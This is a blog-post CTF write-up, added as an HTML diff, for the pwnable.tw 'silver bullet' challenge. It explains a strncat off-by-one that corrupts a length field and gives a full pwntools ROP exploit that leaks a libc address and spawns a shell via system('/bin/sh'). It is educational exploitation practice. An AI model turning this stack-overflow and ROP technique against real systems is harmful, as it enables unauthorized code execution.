@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+<meta content="pwnable.tw - silver bullet" property="og:title"/>
+<meta content="article" property="og:type"/>
+<meta content="2020-02-01T22:31:07.835Z" property="og:published_time"/>
+<meta content="2020-02-04T19:12:43.206Z" property="og:modified_time"/>
+<meta content="Srikavin Ramkumar" property="og:author"/>
+<meta content="ctf-writeups" property="og:section"/>
+<meta content="pwnable.tw" property="og:tag"/>
+<meta content="binary-exploitation" property="og:tag"/>
+<meta content="return-oriented-programming" property="og:tag"/>
+<meta content="pwntools" property="og:tag"/>
+<meta content="/posts/pwnable-tw-silver-bullet/" property="og:url"/>
+
+    <title>pwnable.tw - silver bullet - srikavin.me</title>
+    <link rel="stylesheet" href="/bundle.css">
+</head>
+
+<body>
+<nav>
+    <div class="nav-left">
+        <span>
+            <a href="https://srikavin.me" class="name">Srikavin Ramkumar</a>
+        </span>
+        <span>
+            <a href="/posts" class="nav-link">Posts</a>
+        </span>
+        <span>
+            <a class="nav-link" href="/tags">Tags</a>
+        </span>
+    </div>
+</nav>
+<section class="section">
+    <div class="container">
+        
+
+<div class="blog-container">
+    
+
+
+<div class="blog-header">
+    <h1 class="title">
+        
+        pwnable.tw - silver bullet
+        
+    </h1>
+    <div class="subtitle">
+                    <span>Posted on
+                        <span class="date" title="Created: 2020-02-01T22:31:07.835Z&#10;Updated: 2020-02-04T19:12:43.206Z">February  1, 2020*
+                        </span>
+
+                        in ctf-writeups
+                        
+                </span>
+    </div>
+    <div class="tags">
+        
+        
+        <a href="&#x2F;tags&#x2F;pwnable-tw&#x2F;"><span class="tag minimal interactive">pwnable.tw</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;binary-exploitation&#x2F;"><span class="tag minimal interactive">binary-exploitation</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;return-oriented-programming&#x2F;"><span class="tag minimal interactive">return-oriented-programming</span></a>
+        
+        
+        <a href="&#x2F;tags&#x2F;pwntools&#x2F;"><span class="tag minimal interactive">pwntools</span></a>
+        
+    </div>
+</div>
+
+
+<div class="blog-content light">
+    <div class="blog-scrollspy">
+        <h1 class="scrollspy-label">Table of Contents</h1>
+        <ul>
+            
+            <li>
+                <a data-target="challenge" href="#challenge">Challenge</a>
+                
+            </li>
+            
+            <li>
+                <a data-target="solution" href="#solution">Solution</a>
+                
+            </li>
+            
+            <li>
+                <a data-target="script" href="#script">Script</a>
+                
+            </li>
+            
+        </ul>
+    </div>
+
+    <h1 id="challenge">Challenge</h1>
+<blockquote>
+<p>Please kill the werewolf with silver bullet!</p>
+<p><code>nc chall.pwnable.tw 10103</code></p>
+</blockquote>
+<p>We are also provided a binary and the libc used on the server.</p>
+<h1 id="solution">Solution</h1>
+<p>When running the binary, we can see that we have four options:</p>
+<p><img src="/posts/pwnable-tw-silver-bullet/5d0810548487900bf40e47d5.png" alt="" /></p>
+<p>The provided binary was not stripped, so reversing was easy with Ghidra.</p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">create_bullet</span><span style="color:#323232;">(bullet </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">bullet)
+{
+  </span><span style="color:#0086b3;">size_t</span><span style="color:#323232;"> size;
+  
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(bullet-&gt;description[</span><span style="color:#0086b3;">0</span><span style="color:#323232;">] </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#183691;">&#39;</span><span style="color:#0086b3;">\0</span><span style="color:#183691;">&#39;</span><span style="color:#323232;">) {
+    </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Give me your description of bullet :&quot;</span><span style="color:#323232;">,</span><span style="color:#0086b3;">0</span><span style="color:#323232;">);
+    read_input((</span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">)bullet,</span><span style="color:#0086b3;">0x30</span><span style="color:#323232;">);
+    size </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">strlen</span><span style="color:#323232;">((</span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">)bullet);
+    </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Your power is : </span><span style="color:#0086b3;">%u\n</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">,size);
+    bullet-&gt;power </span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#323232;"> size;
+    </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Good luck !!&quot;</span><span style="color:#323232;">);
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">else </span><span style="color:#323232;">{
+    </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;You have been created the Bullet !&quot;</span><span style="color:#323232;">);
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;">;
+}
+</span></code></pre><span id="continue-reading"></span>
+<p>The <code>create_bullet</code> function simply reads in 48 (0x32) bytes. Then, the power of the bullet is set to the length of the 
+input. Finally, both the power and the input are store in a struct.</p>
+<p> </p>
+<p>I defined <code> bullet</code> as the following struct:</p>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">struct </span><span style="color:#323232;">bullet {
+    </span><span style="font-weight:bold;color:#a71d5d;">char</span><span style="color:#323232;">[</span><span style="color:#0086b3;">48</span><span style="color:#323232;">] description;
+    </span><span style="color:#0086b3;">uint</span><span style="color:#323232;"> power;
+}
+</span></code></pre><pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">void </span><span style="font-weight:bold;color:#795da3;">power_up</span><span style="color:#323232;">(bullet </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">bullet)
+
+{
+  </span><span style="color:#0086b3;">size_t</span><span style="color:#323232;"> new_power;
+  </span><span style="color:#0086b3;">uint</span><span style="color:#323232;"> power;
+  </span><span style="font-weight:bold;color:#a71d5d;">char</span><span style="color:#323232;"> input_buf [</span><span style="color:#0086b3;">48</span><span style="color:#323232;">];
+  
+  </span><span style="color:#62a35c;">memset</span><span style="color:#323232;">(input_buf,</span><span style="color:#0086b3;">0</span><span style="color:#323232;">,</span><span style="color:#0086b3;">0x30</span><span style="color:#323232;">);
+  </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(bullet-&gt;description[</span><span style="color:#0086b3;">0</span><span style="color:#323232;">] </span><span style="font-weight:bold;color:#a71d5d;">== </span><span style="color:#183691;">&#39;</span><span style="color:#0086b3;">\0</span><span style="color:#183691;">&#39;</span><span style="color:#323232;">) {
+    </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;You need create the bullet first !&quot;</span><span style="color:#323232;">);
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">else </span><span style="color:#323232;">{
+    </span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(bullet-&gt;power </span><span style="font-weight:bold;color:#a71d5d;">&lt; </span><span style="color:#0086b3;">0x30</span><span style="color:#323232;">) {
+      </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Give me your another description of bullet :&quot;</span><span style="color:#323232;">);
+      read_input(input_buf,</span><span style="color:#0086b3;">0x30 </span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#323232;"> bullet-&gt;power);
+      </span><span style="color:#62a35c;">strncat</span><span style="color:#323232;">((</span><span style="font-weight:bold;color:#a71d5d;">char *</span><span style="color:#323232;">)bullet,input_buf,</span><span style="color:#0086b3;">0x30 </span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#323232;"> bullet-&gt;power);
+      new_power </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">strlen</span><span style="color:#323232;">(input_buf);
+      power </span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#323232;"> bullet-&gt;power </span><span style="font-weight:bold;color:#a71d5d;">+</span><span style="color:#323232;"> new_power;
+      </span><span style="color:#62a35c;">printf</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Your new power is : </span><span style="color:#0086b3;">%u\n</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">,power);
+      bullet-&gt;power </span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#323232;"> power;
+      </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Enjoy it !&quot;</span><span style="color:#323232;">);
+    }
+    </span><span style="font-weight:bold;color:#a71d5d;">else </span><span style="color:#323232;">{
+      </span><span style="color:#62a35c;">puts</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;You can</span><span style="color:#0086b3;">\&#39;</span><span style="color:#183691;">t power up any more !&quot;</span><span style="color:#323232;">);
+    }
+  }
+  </span><span style="font-weight:bold;color:#a71d5d;">return</span><span style="color:#323232;">;
+}
+</span></code></pre>
+<p>The <code>power_up</code> function reads another 48 bytes as input, then it concatenates it to the stored description and updates 
+the power of the bullet. However, there is a hard-to-notice issue with this code. 
+<a href="https://linux.die.net/man/3/strncat">strncat(dest, src, n)</a> writes <code>n+1</code> bytes to the destination buffer. The last byte 
+is the terminating null byte. If we were to give 48 bytes as input to power_up, then it would overwrite the power of the 
+bullet. Now, we can write upto 48 bytes directly onto the stack, and we can use return-oriented-programming to leak a 
+libc address and call <code>system</code>.</p>
+<h1 id="script">Script</h1>
+<pre style="background-color:#ffffff;">
+<code><span style="font-weight:bold;color:#a71d5d;">from </span><span style="color:#323232;">pwn </span><span style="font-weight:bold;color:#a71d5d;">import </span><span style="color:#0086b3;">*
+
+</span><span style="color:#323232;">elf </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;./silver_bullet&#39;</span><span style="color:#323232;">)
+libc </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;./libc_32.so.6&#39;</span><span style="color:#323232;">)
+
+context.binary </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">elf
+
+r </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">remote(</span><span style="color:#183691;">&#39;chall.pwnable.tw&#39;</span><span style="color:#323232;">, </span><span style="color:#0086b3;">10103</span><span style="color:#323232;">)
+
+
+</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">skip_menu</span><span style="color:#323232;">():
+    r.recvuntil(</span><span style="color:#183691;">&#39;+++++++++++++++++++++++++++&#39;</span><span style="color:#323232;">)
+    r.recvuntil(</span><span style="color:#183691;">&#39;+++++++++++++++++++++++++++&#39;</span><span style="color:#323232;">)
+    r.recvuntil(</span><span style="color:#183691;">&#39;+++++++++++++++++++++++++++&#39;</span><span style="color:#323232;">)
+
+
+</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">create_bullet</span><span style="color:#323232;">(d):
+    r.recvuntil(</span><span style="color:#183691;">&#39; :&#39;</span><span style="color:#323232;">)
+    r.write(</span><span style="color:#183691;">&#39;1&#39;</span><span style="color:#323232;">)
+    r.recvuntil(</span><span style="color:#183691;">&#39; :&#39;</span><span style="color:#323232;">)
+    r.write(d)
+    skip_menu()
+
+
+</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">power_up</span><span style="color:#323232;">(d):
+    r.recvuntil(</span><span style="color:#183691;">&#39; :&#39;</span><span style="color:#323232;">)
+    r.write(</span><span style="color:#183691;">&#39;2&#39;</span><span style="color:#323232;">)
+    r.recvuntil(</span><span style="color:#183691;">&#39; :&#39;</span><span style="color:#323232;">)
+    r.write(d)
+    skip_menu()
+
+
+</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">beat</span><span style="color:#323232;">():
+    r.recvuntil(</span><span style="color:#183691;">&#39; :&#39;</span><span style="color:#323232;">)
+    r.write(</span><span style="color:#183691;">&#39;3&#39;</span><span style="color:#323232;">)
+
+
+rop </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ROP(elf)
+rop.call(</span><span style="color:#183691;">&#39;puts&#39;</span><span style="color:#323232;">, [elf.got[</span><span style="color:#183691;">&#39;puts&#39;</span><span style="color:#323232;">]])
+rop.call(</span><span style="color:#183691;">&#39;main&#39;</span><span style="color:#323232;">)
+
+</span><span style="color:#62a35c;">print</span><span style="color:#323232;">(rop.dump())
+
+create_bullet(</span><span style="color:#183691;">&#39;A&#39; </span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#0086b3;">0x2F</span><span style="color:#323232;">)
+power_up(</span><span style="color:#183691;">&#39;A&#39;</span><span style="color:#323232;">)
+power_up(</span><span style="color:#183691;">&#39;A&#39; </span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#0086b3;">7 </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">str</span><span style="color:#323232;">(rop))
+
+beat()
+skip_menu()
+beat()
+
+r.recvuntil(</span><span style="color:#183691;">&#39;!!</span><span style="color:#0086b3;">\x0a</span><span style="color:#183691;">&#39;</span><span style="color:#323232;">)
+</span><span style="color:#0086b3;">ADDR_PUTS </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">u32(r.recv(</span><span style="color:#0086b3;">4</span><span style="color:#323232;">))
+
+</span><span style="color:#0086b3;">LIBC_BASE </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">ADDR_PUTS </span><span style="font-weight:bold;color:#a71d5d;">- </span><span style="color:#323232;">libc.symbols[</span><span style="color:#183691;">&#39;puts&#39;</span><span style="color:#323232;">]
+</span><span style="color:#0086b3;">ADDR_BINSH </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">libc.search(</span><span style="color:#183691;">&#39;/bin/sh&#39;</span><span style="color:#323232;">).next() </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">LIBC_BASE
+ADDR_SYSTEM </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">libc.symbols[</span><span style="color:#183691;">&#39;system&#39;</span><span style="color:#323232;">] </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">LIBC_BASE
+
+</span><span style="color:#323232;">log.info(</span><span style="color:#183691;">&#39;puts address: &#39; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(</span><span style="color:#0086b3;">ADDR_PUTS</span><span style="color:#323232;">))
+log.info(</span><span style="color:#183691;">&#39;Libc base address: &#39; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(</span><span style="color:#0086b3;">LIBC_BASE</span><span style="color:#323232;">))
+log.info(</span><span style="color:#183691;">&#39;System address: &#39; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(</span><span style="color:#0086b3;">ADDR_SYSTEM</span><span style="color:#323232;">))
+log.info(</span><span style="color:#183691;">&#39;`/bin/sh` address: &#39; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(</span><span style="color:#0086b3;">ADDR_BINSH</span><span style="color:#323232;">))
+
+rop </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ROP(elf)
+rop.call(</span><span style="color:#0086b3;">ADDR_SYSTEM</span><span style="color:#323232;">, [</span><span style="color:#0086b3;">ADDR_BINSH</span><span style="color:#323232;">])
+
+create_bullet(</span><span style="color:#183691;">&#39;A&#39; </span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#0086b3;">0x2F</span><span style="color:#323232;">)
+power_up(</span><span style="color:#183691;">&#39;A&#39;</span><span style="color:#323232;">)
+
+power_up(</span><span style="color:#183691;">&#39;A&#39; </span><span style="font-weight:bold;color:#a71d5d;">* </span><span style="color:#0086b3;">7 </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#0086b3;">str</span><span style="color:#323232;">(rop))
+
+</span><span style="color:#62a35c;">print</span><span style="color:#323232;">(rop.dump())
+
+beat()
+skip_menu()
+beat()
+
+r.interactive()
+</span></code></pre>
+<p><img src="/posts/pwnable-tw-silver-bullet/5d08149a8487900bf40e47d7.png" alt="" /></p>
+
+</div>
+
+
+</div>
+
+<script src="https://utteranc.es/client.js"
+        repo="srikavin/blog"
+        issue-term="url"
+        label="💬comments"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+
+    </div>
+</section>
+
+<script src="/bundle.js"></script>
+ 
+
+</body>
+
+</html>
